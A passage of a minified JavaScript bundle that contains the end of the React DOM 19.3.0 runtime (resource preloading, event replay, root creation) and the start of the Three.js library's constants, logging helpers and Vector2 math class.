u=l;switch(n){case"style":u=Ps(t);break;case"script":u=Is(t)}if(!(Mi.has(u)||(t=P({rel:"preload",href:n==="image"&&a&&a.imageSrcSet?void 0:t,as:n},a),Mi.set(u,t),r.querySelector(l)!==null||n==="style"&&r.querySelector(Qo(u))||n==="script"&&r.querySelector(Jo(u))))){var g=r.createElement("link");Nn(g,"link",t),n==="style"&&(g[Kt]=!0,g.onload=g.onerror=function(){Ye(g)}),_e(g),r.head.appendChild(g)}}}function FM(t,n){Ea.m(t,n);var a=Os;if(a&&t){var r=n&&typeof n.as=="string"?n.as:"script",l='link[rel="modulepreload"][as="'+pi(r)+'"][href="'+pi(t)+'"]',u=l;switch(r){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":u=Is(t)}if(!Mi.has(u)&&(t=P({rel:"modulepreload",href:t},n),Mi.set(u,t),a.querySelector(l)===null)){switch(r){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(a.querySelector(Jo(u)))return}r=a.createElement("link"),Nn(r,"link",t),_e(r),a.head.appendChild(r)}}}function HM(t,n,a){Ea.S(t,n,a);var r=Os;if(r&&t){var l=ye(r).hoistableStyles,u=Ps(t);n=n||"default";var g=l.get(u);if(!g){var R={loading:0,preload:null};if(g=r.querySelector(Qo(u)))R.loading=5;else{t=P({rel:"stylesheet",href:t,"data-precedence":n},a),(a=Mi.get(u))&&ih(t,a);var I=g=r.createElement("link");_e(I),Nn(I,"link",t),I._p=new Promise(function(Q,ct){I.onload=Q,I.onerror=ct}),I.addEventListener("load",function(){R.loading|=1}),I.addEventListener("error",function(){R.loading|=2}),R.loading|=4,Ic(g,n,r)}g={type:"stylesheet",instance:g,count:1,state:R},l.set(u,g)}}}function GM(t,n){Ea.X(t,n);var a=Os;if(a&&t){var r=ye(a).hoistableScripts,l=Is(t),u=r.get(l);u||(u=a.querySelector(Jo(l)),u||(t=P({src:t,async:!0},n),(n=Mi.get(l))&&ah(t,n),u=a.createElement("script"),_e(u),Nn(u,"link",t),a.head.appendChild(u)),u={type:"script",instance:u,count:1,state:null},r.set(l,u))}}function VM(t,n){Ea.M(t,n);var a=Os;if(a&&t){var r=ye(a).hoistableScripts,l=Is(t),u=r.get(l);u||(u=a.querySelector(Jo(l)),u||(t=P({src:t,async:!0,type:"module"},n),(n=Mi.get(l))&&ah(t,n),u=a.createElement("script"),_e(u),Nn(u,"link",t),a.head.appendChild(u)),u={type:"script",instance:u,count:1,state:null},r.set(l,u))}}function k_(t,n,a,r){var l=(l=Pe.current)?jo(l):null;if(!l)throw Error(s(446));switch(t){case"meta":case"title":return null;case"style":return typeof a.precedence=="string"&&typeof a.href=="string"?(a=Ps(a.href),n=ye(l).hoistableStyles,r=n.get(a),r||(r={type:"style",instance:null,count:0,state:null},n.set(a,r)),r):{type:"void",instance:null,count:0,state:null};case"link":if(a.rel==="stylesheet"&&typeof a.href=="string"&&typeof a.precedence=="string"){t=Ps(a.href);var u=ye(l).hoistableStyles,g=u.get(t);if(g||(l=l.ownerDocument||l,g={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},u.set(t,g),(u=l.querySelector(Qo(t)))?u._p||(g.instance=u,g.state.loading=5):(u=Mi.get(t),u||(u={rel:"preload",as:"style",href:a.href,crossOrigin:a.crossOrigin,integrity:a.integrity,media:a.media,hrefLang:a.hrefLang,referrerPolicy:a.referrerPolicy},Mi.set(t,u)),XM(l,t,u,g.state))),n&&r===null)throw Error(s(528,""));return g}if(n&&r!==null)throw Error(s(529,""));return null;case"script":return n=a.async,a=a.src,typeof a=="string"&&n&&typeof n!="function"&&typeof n!="symbol"?(a=Is(a),n=ye(l).hoistableScripts,r=n.get(a),r||(r={type:"script",instance:null,count:0,state:null},n.set(a,r)),r):{type:"void",instance:null,count:0,state:null};default:throw Error(s(444,t))}}function Ps(t){return'href="'+pi(t)+'"'}function Qo(t){return'link[rel="stylesheet"]['+t+"]"}function W_(t){return P({},t,{"data-precedence":t.precedence,precedence:null})}function XM(t,n,a,r){if(n=t.querySelector('link[rel="preload"][as="style"]['+n+"]")){if(n[Kt]!==!0){r.loading=1;return}}else n=t.createElement("link"),n[Kt]=!0,n.onload=n.onerror=Ye.bind(null,n),Nn(n,"link",a),_e(n),t.head.appendChild(n);r.preload=n,n.addEventListener("load",function(){return r.loading|=1}),n.addEventListener("error",function(){return r.loading|=2})}function Is(t){return'[src="'+pi(t)+'"]'}function Jo(t){return"script[async]"+t}function q_(t,n,a){if(n.count++,n.instance===null)switch(n.type){case"style":var r=t.querySelector('style[data-href~="'+pi(a.href)+'"]');if(r)return n.instance=r,_e(r),r;var l=P({},a,{"data-href":a.href,"data-precedence":a.precedence,href:null,precedence:null});return r=(t.ownerDocument||t).createElement("style"),_e(r),Nn(r,"style",l),Ic(r,a.precedence,t),n.instance=r;case"stylesheet":l=Ps(a.href);var u=t.querySelector(Qo(l));if(u)return n.state.loading|=4,n.instance=u,_e(u),u;r=W_(a),(l=Mi.get(l))&&ih(r,l),u=(t.ownerDocument||t).createElement("link"),_e(u);var g=u;return g._p=new Promise(function(R,I){g.onload=R,g.onerror=I}),Nn(u,"link",r),n.state.loading|=4,Ic(u,a.precedence,t),n.instance=u;case"script":return u=Is(a.src),(l=t.querySelector(Jo(u)))?(n.instance=l,_e(l),l):(r=a,(l=Mi.get(u))&&(r=P({},a),ah(r,l)),t=t.ownerDocument||t,l=t.createElement("script"),_e(l),Nn(l,"link",r),t.head.appendChild(l),n.instance=l);case"void":return null;default:throw Error(s(443,n.type))}else n.type==="stylesheet"&&(n.state.loading&4)===0&&(r=n.instance,n.state.loading|=4,Ic(r,a.precedence,t));return n.instance}function Ic(t,n,a){for(var r=a.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),l=r.length?r[r.length-1]:null,u=l,g=0;g<r.length;g++){var R=r[g];if(R.dataset.precedence===n)u=R;else if(u!==l)break}u?u.parentNode.insertBefore(t,u.nextSibling):(n=a.nodeType===9?a.head:a,n.insertBefore(t,n.firstChild))}function ih(t,n){t.crossOrigin==null&&(t.crossOrigin=n.crossOrigin),t.referrerPolicy==null&&(t.referrerPolicy=n.referrerPolicy),t.title==null&&(t.title=n.title)}function ah(t,n){t.crossOrigin==null&&(t.crossOrigin=n.crossOrigin),t.referrerPolicy==null&&(t.referrerPolicy=n.referrerPolicy),t.integrity==null&&(t.integrity=n.integrity)}var zc=null;function Y_(t,n,a){if(zc===null){var r=new Map,l=zc=new Map;l.set(a,r)}else l=zc,r=l.get(a),r||(r=new Map,l.set(a,r));if(r.has(t))return r;for(r.set(t,null),a=a.getElementsByTagName(t),l=0;l<a.length;l++){var u=a[l];if(!(u[Pt]||u[A]||t==="link"&&u.getAttribute("rel")==="stylesheet")&&u.namespaceURI!=="http://www.w3.org/2000/svg"){var g=u.getAttribute(n)||"";g=t+g;var R=r.get(g);R?R.push(u):r.set(g,[u])}}return r}function rh(t,n,a){t=t.ownerDocument||t,t.head.insertBefore(a,n==="title"?t.querySelector("head > title"):null)}function kM(t,n,a){if(a===1||n.itemProp!=null)return!1;switch(t){case"meta":case"title":return!0;case"style":if(typeof n.precedence!="string"||typeof n.href!="string"||n.href==="")break;return!0;case"link":if(typeof n.rel!="string"||typeof n.href!="string"||n.href===""||n.onLoad||n.onError)break;switch(n.rel){case"stylesheet":return t=n.disabled,typeof n.precedence=="string"&&t==null;default:return!0}case"script":if(n.async&&typeof n.async!="function"&&typeof n.async!="symbol"&&!n.onLoad&&!n.onError&&n.src&&typeof n.src=="string")return!0}return!1}function Z_(t,n){return t==="img"&&n.src!=null&&n.src!==""&&n.onLoad==null&&n.loading!=="lazy"}function K_(t){return!(t.type==="stylesheet"&&(t.state.loading&3)===0)}function j_(t){return(t.width||100)*(t.height||100)*(typeof devicePixelRatio=="number"?devicePixelRatio:1)*.25}function Q_(t,n){typeof n.decode=="function"&&(t.imgCount++,n.complete||(t.imgBytes+=j_(n),t.suspenseyImages.push(n)),t=YM.bind(t),n.decode().then(t,t))}function WM(t,n,a,r){if(a.type==="stylesheet"&&(typeof r.media!="string"||matchMedia(r.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var l=Ps(r.href),u=n.querySelector(Qo(l));if(u){n=u._p,n!==null&&typeof n=="object"&&typeof n.then=="function"&&(t.count++,t=$o.bind(t),n.then(t,t)),a.state.loading|=4,a.instance=u,_e(u);return}u=n.ownerDocument||n,r=W_(r),(l=Mi.get(l))&&ih(r,l),u=u.createElement("link"),_e(u);var g=u;g._p=new Promise(function(R,I){g.onload=R,g.onerror=I}),Nn(u,"link",r),a.instance=u}t.stylesheets===null&&(t.stylesheets=new Map),t.stylesheets.set(a,n),(n=a.state.preload)&&(a.state.loading&3)===0&&(t.count++,a=$o.bind(t),n.addEventListener("load",a),n.addEventListener("error",a))}}var Bc=0;function qM(t,n){return t.stylesheets&&t.count===0&&Hc(t,t.stylesheets),0<t.count||0<t.imgCount?function(a){var r=setTimeout(function(){if(t.stylesheets&&Hc(t,t.stylesheets),t.unsuspend){var u=t.unsuspend;t.unsuspend=null,u()}},6e4+n);0<t.imgBytes&&Bc===0&&(Bc=62500*uM());var l=setTimeout(function(){if(t.waitingForImages=!1,t.count===0&&(t.stylesheets&&Hc(t,t.stylesheets),t.unsuspend)){var u=t.unsuspend;t.unsuspend=null,u()}},(t.imgBytes>Bc?50:800)+n);return t.unsuspend=a,function(){t.unsuspend=null,clearTimeout(r),clearTimeout(l)}}:null}function J_(t){if(t.count===0&&(t.imgCount===0||!t.waitingForImages)){if(t.stylesheets)Hc(t,t.stylesheets);else if(t.unsuspend){var n=t.unsuspend;t.unsuspend=null,n()}}}function $o(){this.count--,J_(this)}function YM(){this.imgCount--,J_(this)}var Fc=null;function Hc(t,n){t.stylesheets=null,t.unsuspend!==null&&(t.count++,Fc=new Map,n.forEach(ZM,t),Fc=null,$o.call(t))}function ZM(t,n){if(!(n.state.loading&4)){var a=Fc.get(t);if(a)var r=a.get(null);else{a=new Map,Fc.set(t,a);for(var l=t.querySelectorAll("link[data-precedence],style[data-precedence]"),u=0;u<l.length;u++){var g=l[u];(g.nodeName==="LINK"||g.getAttribute("media")!=="not all")&&(a.set(g.dataset.precedence,g),r=g)}r&&a.set(null,r)}l=n.instance,g=l.getAttribute("data-precedence"),u=a.get(g)||r,u===r&&a.set(null,l),a.set(g,l),this.count++,r=$o.bind(this),l.addEventListener("load",r),l.addEventListener("error",r),u?u.parentNode.insertBefore(l,u.nextSibling):(t=t.nodeType===9?t.head:t,t.insertBefore(l,t.firstChild)),n.state.loading|=4}}var zs={$$typeof:et,Provider:null,Consumer:null,_currentValue:Le,_currentValue2:Le,_threadCount:0};function KM(t,n,a,r,l,u,g,R,I){this.tag=1,this.containerInfo=t,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=ts(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ts(0),this.hiddenUpdates=ts(null),this.identifierPrefix=r,this.onUncaughtError=l,this.onCaughtError=u,this.onRecoverableError=g,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=I,this.transitionTypes=null,this.incompleteTransitions=new Map}function $_(t,n,a,r,l,u,g,R,I,Q,ct,yt){return t=new KM(t,n,a,g,I,Q,ct,yt,R),n=1,u===!0&&(n|=24),u=qn(3,null,null,n),t.current=u,u.stateNode=t,n=Sf(),n.refCount++,t.pooledCache=n,n.refCount++,u.memoizedState={element:r,isDehydrated:a,cache:n},bf(u),t}function tv(t){return t?(t=cs,t):cs}function ev(t,n,a,r,l,u){l=tv(l),r.context===null?r.context=l:r.pendingContext=l,r=qa(n),r.payload={element:a},u=u===void 0?null:u,u!==null&&(r.callback=u),a=Ya(t,r,n),a!==null&&(jn(a,t,n),No(a,t,n))}function nv(t,n){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var a=t.retryLane;t.retryLane=a!==0&&a<n?a:n}}function sh(t,n){nv(t,n),(t=t.alternate)&&nv(t,n)}function iv(t){if(t.tag===13||t.tag===31){var n=Mr(t,67108864);n!==null&&jn(n,t,67108864),sh(t,67108864)}}function av(t){if(t.tag===13||t.tag===31){var n=li();n=ho(n);var a=Mr(t,n);a!==null&&jn(a,t,n),sh(t,n)}}var Bs=!0;function jM(t,n,a,r){var l=_t.T;_t.T=null;var u=Rt.p;try{Rt.p=2,oh(t,n,a,r)}finally{Rt.p=u,_t.T=l}}function QM(t,n,a,r){var l=_t.T;_t.T=null;var u=Rt.p;try{Rt.p=8,oh(t,n,a,r)}finally{Rt.p=u,_t.T=l}}function oh(t,n,a,r){if(Bs){var l=lh(r);if(l===null)Vd(t,n,r,Gc,a),sv(t,r);else if($M(l,t,n,a,r))r.stopPropagation();else if(sv(t,r),n&4&&-1<JM.indexOf(t)){for(;l!==null;){var u=fe(l);if(u!==null)switch(u.tag){case 3:if(u=u.stateNode,u.current.memoizedState.isDehydrated){var g=ca(u.pendingLanes);if(g!==0){var R=u;for(R.pendingLanes|=2,R.entangledLanes|=2;g;){var I=1<<31-ue(g);R.entanglements[1]|=I,g&=~I}$i(u),(Fe&6)===0&&(Ac=Wt()+500,qo(0))}}break;case 31:case 13:R=Mr(u,2),R!==null&&jn(R,u,2),wc(),sh(u,2)}if(u=lh(r),u===null&&Vd(t,n,r,Gc,a),u===l)break;l=u}l!==null&&r.stopPropagation()}else Vd(t,n,r,null,a)}}function lh(t){return t=qu(t),ch(t)}var Gc=null;function ch(t){if(Gc=null,t=re(t),t!==null){var n=f(t);if(n===null)t=null;else{var a=n.tag;if(a===13){if(t=d(n),t!==null)return t;t=null}else if(a===31){if(t=h(n),t!==null)return t;t=null}else if(a===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;t=null}else n!==t&&(t=null)}}return Gc=t,null}function rv(t){switch(t){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"fullscreenerror":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"resize":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(ne()){case ce:return 2;case X:return 8;case Nt:case Mt:return 32;case Ot:return 268435456;default:return 32}default:return 32}}var uh=!1,rr=null,sr=null,or=null,tl=new Map,el=new Map,lr=[],JM="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function sv(t,n){switch(t){case"focusin":case"focusout":rr=null;break;case"dragenter":case"dragleave":sr=null;break;case"mouseover":case"mouseout":or=null;break;case"pointerover":case"pointerout":tl.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":el.delete(n.pointerId)}}function nl(t,n,a,r,l,u){return t===null||t.nativeEvent!==u?(t={blockedOn:n,domEventName:a,eventSystemFlags:r,nativeEvent:u,targetContainers:[l]},n!==null&&(n=fe(n),n!==null&&iv(n)),t):(t.eventSystemFlags|=r,n=t.targetContainers,l!==null&&n.indexOf(l)===-1&&n.push(l),t)}function $M(t,n,a,r,l){switch(n){case"focusin":return rr=nl(rr,t,n,a,r,l),!0;case"dragenter":return sr=nl(sr,t,n,a,r,l),!0;case"mouseover":return or=nl(or,t,n,a,r,l),!0;case"pointerover":var u=l.pointerId;return tl.set(u,nl(tl.get(u)||null,t,n,a,r,l)),!0;case"gotpointercapture":return u=l.pointerId,el.set(u,nl(el.get(u)||null,t,n,a,r,l)),!0}return!1}function ov(t){var n=re(t.target);if(n!==null){var a=f(n);if(a!==null){if(n=a.tag,n===13){if(n=d(a),n!==null){t.blockedOn=n,Rl(t.priority,function(){av(a)});return}}else if(n===31){if(n=h(a),n!==null){t.blockedOn=n,Rl(t.priority,function(){av(a)});return}}else if(n===3&&a.stateNode.current.memoizedState.isDehydrated){t.blockedOn=a.tag===3?a.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Vc(t){if(t.blockedOn!==null)return!1;for(var n=t.targetContainers;0<n.length;){var a=lh(t.nativeEvent);if(a===null){a=t.nativeEvent;var r=new a.constructor(a.type,a);Wu=r,a.target.dispatchEvent(r),Wu=null}else return n=fe(a),n!==null&&iv(n),t.blockedOn=a,!1;n.shift()}return!0}function lv(t,n,a){Vc(t)&&a.delete(n)}function tE(){uh=!1,rr!==null&&Vc(rr)&&(rr=null),sr!==null&&Vc(sr)&&(sr=null),or!==null&&Vc(or)&&(or=null),tl.forEach(lv),el.forEach(lv)}function Xc(t,n){t.blockedOn===n&&(t.blockedOn=null,uh||(uh=!0,o.unstable_scheduleCallback(o.unstable_NormalPriority,tE)))}var kc=null;function cv(t){kc!==t&&(kc=t,o.unstable_scheduleCallback(o.unstable_NormalPriority,function(){kc===t&&(kc=null);for(var n=0;n<t.length;n+=3){var a=t[n],r=t[n+1],l=t[n+2];if(typeof r!="function"){if(ch(r||a)===null)continue;break}var u=fe(a);u!==null&&(t.splice(n,3),n-=3,Wf(u,{pending:!0,data:l,method:a.method,action:r},r,l))}}))}function Fs(t){function n(I){return Xc(I,t)}rr!==null&&Xc(rr,t),sr!==null&&Xc(sr,t),or!==null&&Xc(or,t),tl.forEach(n),el.forEach(n);for(var a=0;a<lr.length;a++){var r=lr[a];r.blockedOn===t&&(r.blockedOn=null)}for(;0<lr.length&&(a=lr[0],a.blockedOn===null);)ov(a),a.blockedOn===null&&lr.shift();if(a=(t.ownerDocument||t).$$reactFormReplay,a!=null)for(r=0;r<a.length;r+=3){var l=a[r],u=a[r+1],g=l[H]||null;if(typeof u=="function")g||cv(a);else if(g){var R=null;if(u&&u.hasAttribute("formAction")){if(l=u,g=u[H]||null)R=g.formAction;else if(ch(l)!==null)continue}else R=g.action;typeof R=="function"?a[r+1]=R:(a.splice(r,3),r-=3),cv(a)}}}function uv(){function t(u){u.canIntercept&&u.info==="react-transition"&&u.intercept({handler:function(){return new Promise(function(g){return l=g})},focusReset:"manual",scroll:"manual"})}function n(){l!==null&&(l(),l=null),r||setTimeout(a,20)}function a(){if(!r&&!navigation.transition){var u=navigation.currentEntry;u&&u.url!=null&&navigation.navigate(u.url,{state:u.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var r=!1,l=null;return navigation.addEventListener("navigate",t),navigation.addEventListener("navigatesuccess",n),navigation.addEventListener("navigateerror",n),setTimeout(a,100),function(){r=!0,navigation.removeEventListener("navigate",t),navigation.removeEventListener("navigatesuccess",n),navigation.removeEventListener("navigateerror",n),l!==null&&(l(),l=null)}}}function fh(t){this._internalRoot=t}Wc.prototype.render=fh.prototype.render=function(t){var n=this._internalRoot;if(n===null)throw Error(s(409));var a=n.current,r=li();ev(a,r,t,n,null,null)},Wc.prototype.unmount=fh.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var n=t.containerInfo;ev(t.current,2,null,t,null,null),wc(),n[dt]=null}};function Wc(t){this._internalRoot=t}Wc.prototype.unstable_scheduleHydration=function(t){if(t){var n=Al();t={blockedOn:null,target:t,priority:n};for(var a=0;a<lr.length&&n!==0&&n<lr[a].priority;a++);lr.splice(a,0,t),a===0&&ov(t)}};var fv=e.version;if(fv!=="19.3.0")throw Error(s(527,fv,"19.3.0"));Rt.findDOMNode=function(t){var n=t._reactInternals;if(n===void 0)throw typeof t.render=="function"?Error(s(188)):(t=Object.keys(t).join(","),Error(s(268,t)));return t=p(n),t=t!==null?x(t):null,t=t===null?null:t.stateNode,t};var eE={bundleType:0,version:"19.3.0",rendererPackageName:"react-dom",currentDispatcherRef:_t,reconcilerVersion:"19.3.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var qc=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!qc.isDisabled&&qc.supportsFiber)try{Jt=qc.inject(eE),Xt=qc}catch{}}return al.createRoot=function(t,n){if(!c(t))throw Error(s(299));var a=!1,r="",l=tg,u=eg,g=ng;return n!=null&&(n.unstable_strictMode===!0&&(a=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onUncaughtError!==void 0&&(l=n.onUncaughtError),n.onCaughtError!==void 0&&(u=n.onCaughtError),n.onRecoverableError!==void 0&&(g=n.onRecoverableError)),n=$_(t,1,!1,null,null,a,r,null,l,u,g,uv),t[dt]=n.current,Gd(t),new fh(n)},al.hydrateRoot=function(t,n,a){if(!c(t))throw Error(s(299));var r=!1,l="",u=tg,g=eg,R=ng,I=null;return a!=null&&(a.unstable_strictMode===!0&&(r=!0),a.identifierPrefix!==void 0&&(l=a.identifierPrefix),a.onUncaughtError!==void 0&&(u=a.onUncaughtError),a.onCaughtError!==void 0&&(g=a.onCaughtError),a.onRecoverableError!==void 0&&(R=a.onRecoverableError),a.formState!==void 0&&(I=a.formState)),n=$_(t,1,!0,n,a??null,r,l,I,u,g,R,uv),n.context=tv(null),a=n.current,r=li(),r=ho(r),l=qa(r),l.callback=null,Ya(a,l,r),a=r,n.current.lanes=a,Gi(n,a),$i(n),t[dt]=n.current,Gd(t),new Wc(n)},al.version="19.3.0",al}var yv;function dE(){if(yv)return ph.exports;yv=1;function o(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(o)}catch(e){console.error(e)}}return o(),ph.exports=fE(),ph.exports}var hE=dE();const pE=Rx(hE);/**
 * @license
 * Copyright 2010-2026 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const Wp="186",mE=0,Mv=1,gE=2,yu=1,_E=2,pl=3,Zr=0,Jn=1,wa=2,Da=0,gl=1,$h=2,Ev=3,bv=4,vE=5,$s=100,xE=101,SE=102,yE=103,ME=104,EE=200,bE=201,TE=202,AE=203,Cx=204,wx=205,RE=206,CE=207,wE=208,NE=209,DE=210,UE=211,LE=212,OE=213,PE=214,tp=0,ep=1,np=2,_l=3,ip=4,ap=5,rp=6,sp=7,Nx=0,IE=1,zE=2,ra=0,Dx=1,Ux=2,Lx=3,Ox=4,Px=5,Ix=6,zx=7,Bx=300,Kr=301,io=302,vh=303,xh=304,Iu=306,op=1e3,Na=1001,lp=1002,Un=1003,BE=1004,Yc=1005,In=1006,Sh=1007,qr=1008,Ai=1009,Fx=1010,Hx=1011,vl=1012,qp=1013,sa=1014,ia=1015,oa=1016,Yp=1017,Zp=1018,xl=1020,Gx=35902,Vx=35899,Xx=1021,kx=1022,zi=1023,La=1026,Yr=1027,Wx=1028,Kp=1029,jr=1030,jp=1031,Qp=1033,Mu=33776,Eu=33777,bu=33778,Tu=33779,cp=35840,up=35841,fp=35842,dp=35843,hp=36196,pp=37492,mp=37496,gp=37488,_p=37489,Ru=37490,vp=37491,xp=37808,Sp=37809,yp=37810,Mp=37811,Ep=37812,bp=37813,Tp=37814,Ap=37815,Rp=37816,Cp=37817,wp=37818,Np=37819,Dp=37820,Up=37821,Lp=36492,Op=36494,Pp=36495,Ip=36283,zp=36284,Cu=36285,Bp=36286,FE=3200,Tv=0,HE=1,gr="",bi="srgb",wu="srgb-linear",Nu="linear",qe="srgb",yh=7680,GE=519,VE=512,XE=513,kE=514,Jp=515,WE=516,qE=517,$p=518,YE=519,ZE=35044,Av="300 es",aa=2e3,Du=2001;function KE(o){for(let e=o.length-1;e>=0;--e)if(o[e]>=65535)return!0;return!1}function Uu(o){return document.createElementNS("http://www.w3.org/1999/xhtml",o)}function jE(){const o=Uu("canvas");return o.style.display="block",o}const Rv={};function Cv(...o){const e="THREE."+o.shift();console.log(e,...o)}function qx(o){const e=o[0];if(typeof e=="string"&&e.startsWith("TSL:")){const i=o[1];i&&i.isStackTrace?o[0]+=" "+i.getLocation():o[1]='Stack trace not available. Enable "THREE.Node.captureStackTrace" to capture stack traces.'}return o}function se(...o){o=qx(o);const e="THREE."+o.shift();{const i=o[0];i&&i.isStackTrace?console.warn(i.getError(e)):console.warn(e,...o)}}function Ie(...o){o=qx(o);const e="THREE."+o.shift();{const i=o[0];i&&i.isStackTrace?console.error(i.getError(e)):console.error(e,...o)}}function eo(...o){const e=o.join(" ");e in Rv||(Rv[e]=!0,se(...o))}function QE(o,e,i){return new Promise(function(s,c){function f(){switch(o.clientWaitSync(e,o.SYNC_FLUSH_COMMANDS_BIT,0)){case o.WAIT_FAILED:c();break;case o.TIMEOUT_EXPIRED:setTimeout(f,i);break;default:s()}}setTimeout(f,i)})}const JE={[tp]:ep,[np]:rp,[ip]:sp,[_l]:ap,[ep]:tp,[rp]:np,[sp]:ip,[ap]:_l};class Jr{addEventListener(e,i){this._listeners===void 0&&(this._listeners={});const s=this._listeners;s[e]===void 0&&(s[e]=[]),s[e].indexOf(i)===-1&&s[e].push(i)}hasEventListener(e,i){const s=this._listeners;return s===void 0?!1:s[e]!==void 0&&s[e].indexOf(i)!==-1}removeEventListener(e,i){const s=this._listeners;if(s===void 0)return;const c=s[e];if(c!==void 0){const f=c.indexOf(i);f!==-1&&c.splice(f,1)}}dispatchEvent(e){const i=this._listeners;if(i===void 0)return;const s=i[e.type];if(s!==void 0){e.target=this;const c=s.slice(0);for(let f=0,d=c.length;f<d;f++)c[f].call(this,e);e.target=null}}}const On=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],Mh=Math.PI/180,Fp=180/Math.PI;function yl(){const o=Math.random()*4294967295|0,e=Math.random()*4294967295|0,i=Math.random()*4294967295|0,s=Math.random()*4294967295|0;return(On[o&255]+On[o>>8&255]+On[o>>16&255]+On[o>>24&255]+"-"+On[e&255]+On[e>>8&255]+"-"+On[e>>16&15|64]+On[e>>24&255]+"-"+On[i&63|128]+On[i>>8&255]+"-"+On[i>>16&255]+On[i>>24&255]+On[s&255]+On[s>>8&255]+On[s>>16&255]+On[s>>24&255]).toLowerCase()}function Ne(o,e,i){return Math.max(e,Math.min(i,o))}function $E(o,e){return(o%e+e)%e}function Eh(o,e,i){return(1-i)*o+i*e}function rl(o,e){switch(e.constructor){case Float32Array:return o;case Uint32Array:return o/4294967295;case Uint16Array:return o/65535;case Uint8Array:case Uint8ClampedArray:return o/255;case Int32Array:return Math.max(o/2147483647,-1);case Int16Array:return Math.max(o/32767,-1);case Int8Array:return Math.max(o/127,-1);default:throw new Error("THREE.MathUtils: Invalid component type.")}}function Qn(o,e){switch(e.constructor){case Float32Array:return o;case Uint32Array:return Math.round(o*4294967295);case Uint16Array:return Math.round(o*65535);case Uint8Array:case Uint8ClampedArray:return Math.round(o*255);case Int32Array:return Math.round(o*2147483647);case Int16Array:return Math.round(o*32767);case Int8Array:return Math.round(o*127);default:throw new Error("THREE.MathUtils: Invalid component type.")}}const am=class am{constructor(e=0,i=0){this.x=e,this.y=i}get width(){return this.x}set width(e){this.x=e}get height(){return this.y}set height(e){this.y=e}set(e,i){return this.x=e,this.y=i,this}setScalar(e){return this.x=e,this.y=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setComponent(e,i){switch(e){case 0:this.x=i;break;case 1:this.y=i;break;default:throw new Error("THREE.Vector2: index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("THREE.Vector2: index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y)}copy(e){return this.x=e.x,this.y=e.y,this}add(e){return this.x+=e.x,this.y+=e.y,this}addScalar(e){return this.x+=e,this.y+=e,this}addVectors(e,i){return this.x=e.x+i.x,this.y=e.y+i.y,this}addScaledVector(e,i){return this.x+=e.x*i,this.y+=e.y*i,this}sub(e){return 